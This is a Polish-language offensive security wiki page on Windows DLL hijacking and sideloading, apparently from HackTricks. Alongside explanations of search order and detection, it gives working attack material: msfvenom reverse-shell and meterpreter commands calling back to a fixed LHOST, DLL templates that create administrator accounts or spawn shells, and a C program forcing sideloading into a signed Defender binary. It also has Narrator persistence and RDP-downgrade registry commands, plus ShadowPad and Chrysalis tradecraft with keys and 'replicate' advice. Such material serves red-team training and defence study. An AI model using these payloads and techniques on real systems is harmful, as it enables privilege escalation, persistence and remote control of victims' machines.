# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Podstawowe informacje

DLL Hijacking polega na zmanipulowaniu zaufanej aplikacji tak, aby załadowała złośliwą DLL. Termin ten obejmuje kilka taktyk, takich jak **DLL Spoofing, Injection, and Side-Loading**. Metoda jest używana głównie do wykonania kodu, osiągnięcia persistence oraz, rzadziej, eskalacji uprawnień. Pomimo że tutaj skupiamy się na eskalacji, sposób hijackingu pozostaje taki sam niezależnie od celu.

### Typowe techniki

Kilka metod stosowanych w DLL hijackingu — ich skuteczność zależy od strategii ładowania DLL przez aplikację:

1. **DLL Replacement**: Zamiana prawdziwej DLL na złośliwą, opcjonalnie używając DLL Proxying, aby zachować funkcjonalność oryginalnej DLL.
2. **DLL Search Order Hijacking**: Umieszczenie złośliwej DLL w ścieżce wyszukiwania przed tą prawidłową, wykorzystując wzorzec wyszukiwania aplikacji.
3. **Phantom DLL Hijacking**: Utworzenie złośliwej DLL, którą aplikacja załaduje, myśląc, że to wymagana, nieistniejąca DLL.
4. **DLL Redirection**: Modyfikacja parametrów wyszukiwania, takich jak %PATH% albo pliki .exe.manifest / .exe.local, aby skierować aplikację do złośliwej DLL.
5. **WinSxS DLL Replacement**: Podmiana prawidłowej DLL na złośliwą kopię w katalogu WinSxS — metoda często związana z DLL side-loading.
6. **Relative Path DLL Hijacking**: Umieszczenie złośliwej DLL w katalogu kontrolowanym przez użytkownika razem ze skopiowaną aplikacją, przypominające techniki Binary Proxy Execution.

> [!TIP]
> Aby zobaczyć łańcuch krok po kroku, który nakłada HTML staging, AES-CTR configs i .NET implants na DLL sideloading, zapoznaj się z workflow poniżej.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

Najczęstszym sposobem znalezienia brakujących Dll w systemie jest uruchomienie [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) z Sysinternals i **ustawienie** **następujących 2 filtrów**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

i wyświetlanie jedynie **File System Activity**:

![](<../../../images/image (153).png>)

Jeśli szukasz **missing dlls in general** zostaw to działające na kilka **seconds**.\
Jeśli szukasz **missing dll inside an specific executable** powinieneś ustawić **inny filtr, np. "Process Name" "contains" `<exec name>`, uruchomić go i zatrzymać przechwytywanie zdarzeń**.

## Exploiting Missing Dlls

Aby eskalować uprawnienia, nasza najlepsza szansa to móc **zapisać dll, którą proces z wyższymi uprawnieniami spróbuje załadować** w jednym z miejsc, **gdzie będzie ona wyszukiwana**. W praktyce oznacza to, że będziemy mogli **zapisać** dll w **folderze**, w którym **dll jest wyszukiwany przed** katalogiem zawierającym **oryginalną dll** (dziwny przypadek), albo zapisać ją w jakimś katalogu, w którym dll będzie wyszukiwana, a oryginalna **dll nie istnieje** w żadnym katalogu.

### Dll Search Order

W [**dokumentacji Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) można znaleźć szczegóły, jak Dll są ładowane.

Aplikacje Windows szukają DLL, podążając za zestawem **predefiniowanych ścieżek wyszukiwania** w określonej kolejności. Problem DLL hijackingu pojawia się, gdy złośliwa DLL jest strategicznie umieszczona w jednym z tych katalogów, tak że zostanie załadowana przed oryginalną DLL. Rozwiązaniem zapobiegającym temu jest zapewnienie, że aplikacja używa ścieżek bezwzględnych przy odwoływaniu się do wymaganych DLL.

Poniżej przedstawiono **DLL search order** na systemach 32-bitowych:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

To jest domyślna kolejność wyszukiwania przy włączonym **SafeDllSearchMode**. Kiedy jest wyłączony, bieżący katalog awansuje na drugie miejsce. Aby wyłączyć tę funkcję, utwórz wartość rejestru **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i ustaw ją na 0 (domyślnie włączone).

Jeśli funkcja [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) jest wywoływana z flagą **LOAD_WITH_ALTERED_SEARCH_PATH**, wyszukiwanie zaczyna się w katalogu modułu wykonywalnego, który **LoadLibraryEx** ładuje.

Na koniec, zwróć uwagę, że **dll może być ładowana wskazując ścieżkę bezwzględną zamiast samej nazwy**. W takim przypadku ta dll będzie **wyszukiwana tylko w tej ścieżce** (jeśli dll ma jakieś zależności, będą one wyszukiwane jakby były załadowane tylko po nazwie).

Istnieją inne sposoby zmiany kolejności wyszukiwania, ale nie będę ich tu wyjaśniać.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Zaawansowany sposób deterministycznego wpływania na ścieżkę wyszukiwania DLL nowo tworzonego procesu polega na ustawieniu pola DllPath w RTL_USER_PROCESS_PARAMETERS podczas tworzenia procesu za pomocą natywnych API ntdll. Dostarczając tu katalog kontrolowany przez atakującego, proces docelowy, który rozwiązuje importowaną DLL po nazwie (bez ścieżki bezwzględnej i bez użycia flag bezpiecznego ładowania), może zostać zmuszony do załadowania złośliwej DLL z tego katalogu.

Kluczowy pomysł
- Zbuduj parametry procesu za pomocą RtlCreateProcessParametersEx i podaj niestandardowy DllPath wskazujący na katalog kontrolowany przez Ciebie (np. katalog, w którym znajduje się Twój dropper/unpacker).
- Utwórz proces za pomocą RtlCreateUserProcess. Gdy docelowy binarny będzie rozwiązywał DLL po nazwie, loader skonsultuje się z dostarczonym DllPath podczas rozwiązywania, co umożliwi niezawodne sideloading nawet gdy złośliwa DLL nie jest współlokowana z docelowym EXE.

Uwagi/ograniczenia
- To wpływa na tworzyony proces potomny; różni się od SetDllDirectory, które wpływa tylko na bieżący proces.
- Cel musi importować lub wywoływać LoadLibrary dla DLL po nazwie (bez ścieżki bezwzględnej i bez użycia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i hardcoded absolute paths nie mogą być hijackowane. Forwarded exports i SxS mogą zmieniać priorytety.

Minimalny przykład w C (ntdll, wide strings, uproszczone obsługi błędów):

<details>
<summary>Pełny przykład w C: wymuszanie DLL sideloading poprzez RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Przykład użycia w praktyce operacyjnej
- Umieść złośliwy xmllite.dll (eksportujący wymagane funkcje lub proxy do oryginalnego) w swoim katalogu DllPath.
- Uruchom podpisany binarny plik wykonywalny, który znany jest z wyszukiwania xmllite.dll po nazwie używając powyższej techniki. Loader rozwiąże import za pomocą podanego DllPath i załaduje twój DLL.

Ta technika była obserwowana w warunkach rzeczywistych jako napęd łańcuchów multi-stage sideloading: początkowy launcher upuszcza pomocniczy DLL, który następnie uruchamia podpisany przez Microsoft, podatny na przejęcie binarny plik wykonywalny z niestandardowym DllPath, aby wymusić załadowanie DLL-a atakującego z katalogu staging.


#### Wyjątki w kolejności wyszukiwania dll według dokumentacji Windows

W dokumentacji Windows odnotowano pewne wyjątki od standardowej kolejności wyszukiwania DLL:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalating Privileges

**Wymagania**:

- Zidentyfikuj proces, który działa lub będzie działał z **innymi uprawnieniami** (ruch poziomy lub lateralny), któremu **brakuje DLL-a**.
- Upewnij się, że masz **uprawnienia do zapisu** w dowolnym **katalogu**, w którym **DLL** będzie **wyszukiwany**. Ta lokalizacja może być katalogiem pliku wykonywalnego lub katalogiem wchodzącym w skład systemowej ścieżki.

Tak, wymagania są trudne do znalezienia, ponieważ **domyślnie dość dziwne jest znalezienie uprzywilejowanego pliku wykonywalnego pozbawionego dll** i jest to jeszcze **dziwniejsze mieć uprawnienia do zapisu w folderze znajdującym się w system path** (domyślnie nie możesz). Jednak w źle skonfigurowanych środowiskach jest to możliwe.\
W przypadku, gdy będziesz mieć szczęście i spełnisz wymagania, możesz sprawdzić projekt [UACME](https://github.com/hfiref0x/UACME). Nawet jeśli **głównym celem projektu jest bypass UAC**, możesz tam znaleźć **PoC** Dll hijaking dla wersji Windows, którego możesz użyć (prawdopodobnie wystarczy zmienić ścieżkę folderu, w którym masz uprawnienia do zapisu).

Zauważ, że możesz **sprawdzić swoje uprawnienia w folderze** robiąc:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
A także **sprawdź uprawnienia wszystkich folderów w PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Możesz także sprawdzić imports pliku executable oraz exports dll za pomocą:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) sprawdzi, czy masz uprawnienia do zapisu w którymkolwiek folderze znajdującym się w system PATH.\
Other interesting automated tools to discover this vulnerability are **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._

### Example

In case you find an exploitable scenario one of the most important things to successfully exploit it would be to **create a dll that exports at least all the functions the executable will import from it**. Anyway, note that Dll Hijacking comes handy in order to [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) or from[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** You can find an example of **how to create a valid dll** inside this dll hijacking study focused on dll hijacking for execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Moreover, in the **następna sekc**ja you can find some **podstawowe kody dll** that might be useful as **templates** or to create a **dll with non required functions exported**.

## **Tworzenie i kompilacja Dlls**

### **Dll Proxifying**

Zasadniczo **Dll proxy** to Dll zdolna do **uruchomienia twojego złośliwego kodu po załadowaniu**, ale także do **udostępniania** i **działania** zgodnie z **oczekiwaniami** przez **przekazywanie wszystkich wywołań do prawdziwej biblioteki**.

With the tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) or [**Spartacus**](https://github.com/Accenture/Spartacus) you can actually **wskazać plik wykonywalny i wybrać bibliotekę** you want to proxify and **wygenerować proxified dll** or **wskazać the Dll** and **wygenerować proxified dll**.

### **Meterpreter**

**Uzyskaj rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Uzyskaj meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Utwórz użytkownika (x86 — nie widziałem wersji x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Twój własny

Zwróć uwagę, że w kilku przypadkach Dll, który skompilujesz, musi **eksportować kilka funkcji**, które zostaną załadowane przez proces ofiary; jeśli te funkcje nie istnieją, **binary nie będzie w stanie ich załadować** i **exploit zakończy się niepowodzeniem**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Przykład DLL w C++ z tworzeniem użytkownika</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternatywna biblioteka DLL w C z wejściem w wątek</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Studium przypadku: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe nadal sprawdza przewidywalny, specyficzny dla języka localization DLL przy starcie that can be hijacked for arbitrary code execution and persistence.

Kluczowe fakty
- Ścieżka sprawdzania (aktualne kompilacje): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Starsza ścieżka (starsze kompilacje): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. Żadne eksporty nie są wymagane.

Odnajdywanie za pomocą Procmon
- Filtr: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Uruchom Narrator i obserwuj próbę załadowania powyższej ścieżki.

Minimalny DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- With the above, starting Narrator loads the planted DLL. On the secure desktop (logon screen), press CTRL+WIN+ENTER to start Narrator; your DLL executes as SYSTEM on the secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop.
- Execution stops when the RDP session closes—inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- You can clone a built-in Accessibility Tool (AT) registry entry (e.g., CursorIndicator), edit it to point to an arbitrary binary/DLL, import it, then set `configuration` to that AT name. This proxies arbitrary execution under the Accessibility framework.

Notes
- Writing under `%windir%\System32` and changing HKLM values requires admin rights.
- All payload logic can live in `DLL_PROCESS_ATTACH`; no exports are needed.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Przebieg ataku

1. Jako standardowy użytkownik upuść `hostfxr.dll` do `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Poczekaj, aż zaplanowane zadanie uruchomi się o 9:30 w kontekście bieżącego użytkownika.
3. Jeśli administrator jest zalogowany, gdy zadanie się wykona, złośliwy DLL uruchomi się w sesji administratora na średnim poziomie integralności.
4. Użyj standardowych technik UAC bypass, aby eskalować z medium integrity do uprawnień SYSTEM.

## Studium przypadku: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Atakujący często łączą droppery oparte na MSI z DLL side-loading, aby uruchamiać payloady w kontekście zaufanego, podpisanego procesu.

Chain overview
- Użytkownik pobiera MSI. CustomAction uruchamia się cicho podczas instalacji GUI (np. LaunchApplication lub akcja VBScript), rekonstruując kolejną fazę z osadzonych zasobów.
- Dropper zapisuje legalny, podpisany EXE i złośliwy DLL w tym samym katalogu (przykładowa para: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Po uruchomieniu podpisanego EXE, Windows DLL search order ładuje wsc.dll z katalogu roboczego jako pierwszy, wykonując kod atakującego pod podpisanym procesem (ATT&CK T1574.001).

MSI analysis (what to look for)
- Tabela CustomAction:
- Szukaj wpisów uruchamiających executables lub VBScript. Przykładowy podejrzany wzorzec: LaunchApplication wykonujący osadzony plik w tle.
- W Orca (Microsoft Orca.exe) sprawdź tabele CustomAction, InstallExecuteSequence i Binary.
- Osadzone/podzielone payloady w CAB MSI:
- Ekstrakcja administracyjna: msiexec /a package.msi /qb TARGETDIR=C:\out
- Lub użyj lessmsi: lessmsi x package.msi C:\out
- Szukaj wielu małych fragmentów, które są konkatenowane i odszyfrowywane przez VBScript CustomAction. Typowy przebieg:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktyczne sideloading przy użyciu wsc_proxy.exe
- Umieść te dwa pliki w tym samym folderze:
- wsc_proxy.exe: podpisany cyfrowo host (Avast). Proces próbuje załadować wsc.dll po nazwie z jego katalogu.
- wsc.dll: attacker DLL. Jeśli nie są wymagane żadne konkretne eksporty, DllMain może wystarczyć; w przeciwnym razie zbuduj proxy DLL i przekieruj wymagane eksporty do oryginalnej biblioteki, uruchamiając payload w DllMain.
- Zbuduj minimalny DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Dla wymagań eksportu użyj frameworka proxy'ującego (np. DLLirant/Spartacus) do wygenerowania forwarding DLL, który jednocześnie wykona Twój payload.

- Ta technika opiera się na rozwiązywaniu nazw DLL przez plik wykonywalny hosta. Jeśli host używa ścieżek bezwzględnych lub flag bezpiecznego ładowania (np. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack może się nie powieść.
- KnownDLLs, SxS i forwarded exports mogą wpływać na priorytet i trzeba je uwzględnić przy wyborze pliku wykonywalnego hosta oraz zbioru eksportów.

## Podpisane triady + zaszyfrowane payloady (studium przypadku ShadowPad)

Check Point opisał, jak Ink Dragon wdraża ShadowPad używając **triady trzech plików**, żeby wtopić się w legalne oprogramowanie, jednocześnie trzymając podstawowy payload zaszyfrowany na dysku:

1. **Signed host EXE** – nadużywane są firmy takie jak AMD, Realtek czy NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Atakujący zmieniają nazwę wykonywalnego pliku, by wyglądał jak binarka Windows (np. `conhost.exe`), ale podpis Authenticode pozostaje ważny.
2. **Malicious loader DLL** – upuszczana obok EXE pod oczekiwaną nazwą (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL jest zwykle binarką MFC obfuskowaną za pomocą ScatterBrain; jej jedynym zadaniem jest zlokalizować zaszyfrowany blob, odszyfrować go i reflectively map ShadowPad.
3. **Encrypted payload blob** – często przechowywany jako `<name>.tmp` w tym samym katalogu. Po zmapowaniu odszyfrowanego payloadu loader usuwa plik TMP, aby zniszczyć dowody śledcze.

Tradecraft notes:

* Zmiana nazwy podpisanego EXE (przy zachowaniu oryginalnego `OriginalFileName` w nagłówku PE) pozwala mu udawać binarkę Windows, zachowując jednocześnie podpis dostawcy — replikuj nawyk Ink Dragon polegający na upuszczaniu binarek wyglądających jak `conhost.exe`, które w rzeczywistości są narzędziami AMD/NVIDIA.
* Ponieważ wykonywalny plik pozostaje zaufany, większość mechanizmów allowlisting wymaga jedynie, by Twój malicious DLL leżał obok niego. Skoncentruj się na dostosowaniu loader DLL; podpisany plik rodzicielski zazwyczaj może pozostać bez zmian.
* ShadowPadowy decryptor spodziewa się, że TMP blob będzie obok loadera i że będzie zapisywalny, żeby można było wyzerować plik po zmapowaniu. Utrzymaj katalog z prawami zapisu aż payload zostanie załadowany; po załadowaniu do pamięci plik TMP można bezpiecznie usunąć dla OPSEC.

## Studium przypadku: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Niedawna infiltracja Lotus Blossom wykorzystała zaufany łańcuch aktualizacji do dostarczenia droppera spakowanego NSIS, który zainicjował DLL sideload oraz całkowicie in-memory payloady.

Tradecraft flow
- `update.exe` (NSIS) tworzy `%AppData%\Bluetooth`, oznacza go jako **HIDDEN**, upuszcza przemianowany Bitdefender Submission Wizard `BluetoothService.exe`, złośliwy `log.dll` i zaszyfrowany blob `BluetoothService`, a następnie uruchamia EXE.
- Host EXE importuje `log.dll` i wywołuje `LogInit`/`LogWrite`. `LogInit` mmap-loads blob; `LogWrite` odszyfrowuje go przy użyciu niestandardowego strumienia opartego na LCG (konstanty **0x19660D** / **0x3C6EF35F**, materiał klucza wyprowadzony z wcześniejszego hasha), nadpisuje bufor plaintextowym shellcode, zwalnia tymczasowe zasoby i skacze do niego.
- Aby uniknąć IAT, loader rozwiązuje API przez hashowanie nazw eksportów używając **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, następnie stosuje Murmur-podobny avalanche (**0x85EBCA6B**) i porównuje z solonymi hashami docelowymi.

Główny shellcode (Chrysalis)
- Odszyfrowuje PE-podobny główny moduł powtarzając add/XOR/sub z kluczem `gQ2JR&9;` przez pięć przejść, następnie dynamicznie ładuje `Kernel32.dll` → `GetProcAddress`, aby dokończyć rozwiązywanie importów.
- Odtwarza nazwy DLL w czasie wykonywania przez per-znakowe rotacje bitów/XOR transformacje, potem ładuje `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Używa drugiego resolvera, który przegląda **PEB → InMemoryOrderModuleList**, parsuje każdą tabelę eksportów w blokach 4-bajtowych z Murmur-podobnym mieszaniem i tylko w razie braku hasha sięga po `GetProcAddress`.

Osadzona konfiguracja & C2
- Konfiguracja znajduje się wewnątrz upuszczonego pliku `BluetoothService` na **offset 0x30808** (rozmiar **0x980**) i jest odszyfrowywana RC4 z kluczem `qwhvb^435h&*7`, ujawniając URL C2 i User-Agent.
- Beacony budują profil hosta rozdzielany kropkami, poprzedzają tagiem `4Q`, następnie RC4-encrypt z kluczem `vAuig34%^325hGV` przed `HttpSendRequestA` przez HTTPS. Odpowiedzi są RC4-decryptowane i rozdzielane przez switch tagów (`4T` shell, `4V` process exec, `4W/4X` zapis pliku, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + przypadki transferu porcjowanego).
- Tryb wykonania jest sterowany argumentami CLI: brak argów = instaluj persistence (service/Run key) wskazujący na `-i`; `-i` ponownie uruchamia siebie z `-k`; `-k` pomija instalację i uruchamia payload.

Zaobserwowano alternatywny loader
- Ta sama infiltracja upuściła Tiny C Compiler i uruchomiła `svchost.exe -nostdlib -run conf.c` z `C:\ProgramData\USOShared\`, z `libtcc.dll` obok. Dostarczone przez atakującego źródło C osadzało shellcode, kompilowało i uruchamiało w pamięci bez zapisu PE na dysku. Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Ten etap compile-and-run oparty na TCC zaimportował w czasie wykonywania `Wininet.dll` i pobrał second-stage shellcode z hardcoded URL, tworząc elastyczny loader udający compiler run.

## Referencje

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
